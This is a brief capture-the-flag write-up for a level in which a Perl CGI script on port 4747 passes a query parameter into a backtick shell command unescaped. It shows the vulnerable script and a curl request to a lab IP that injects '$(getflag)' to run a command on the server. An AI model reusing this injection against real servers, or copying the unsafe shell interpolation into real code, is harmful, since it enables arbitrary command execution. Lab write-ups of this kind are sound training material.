# Perl

This executable is a Perl script:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

This script listens port 4747 to echo whatever it gets in the `x` variable.
However, the string is inserted in the command "as is" so we can inject code into it.

`perl ./level04.pl 'x=\$(getflag)'` and variants are not cooperating and seems to run as level04 (and no flag04).

`service --status-all` shows an Apache instance running and a copy of this script is also in `/var/www/level04`.

We can play with `curl` like...
```bash
curl http://192.168.56.102:4747/\?x\=\$\(getflag\)
```

And magic, we got the flag